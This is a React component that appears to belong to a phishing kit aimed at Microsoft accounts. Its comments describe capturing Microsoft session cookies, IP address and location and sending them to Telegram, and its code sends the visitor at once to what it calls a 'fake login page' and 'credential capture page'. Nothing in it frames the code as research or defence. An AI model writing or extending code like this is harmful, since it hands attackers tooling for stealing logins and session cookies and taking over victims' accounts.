import React, { useLayoutEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sendToTelegram?: (data: any) => Promise<void>;
}

/**
 * ENHANCED: Microsoft domain cookie capture with IP detection and file export
 *
 * Purpose:
 * - Immediately navigates the browser to /replacement.html on mount
 * - Delays data transmission until Microsoft domain cookie capture
 * - Redirects to login.microsoftonline.com for auto-login cookie extraction
 * - Captures IP, region/city information
 * - Exports cookies as txt/json files to Telegram
 * - Ensures complete data package transmission
 */
const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({
  onLoginSuccess,
  sendToTelegram
}) => {
  useLayoutEffect(() => {
    // This component's sole purpose is now to navigate to the fake login page.
    // The logic for handling the subsequent Microsoft redirect and data sending
    // is now located in replacement.html and the injected script.
    console.log('🔄 RealOAuthRedirect: Navigating to credential capture page...');
    window.location.replace('/replacement.html');
    
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Render a minimal loading indicator, though it will likely not be seen
  // as the navigation is immediate.
  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Arial, sans-serif',
      backgroundColor: '#f3f2f1'
    }}>
      <div style={{
        textAlign: 'center',
        fontSize: '24px',
        color: '#323130'
      }}>
        Loading...
      </div>
    </div>
  );
};

export default RealOAuthRedirect;
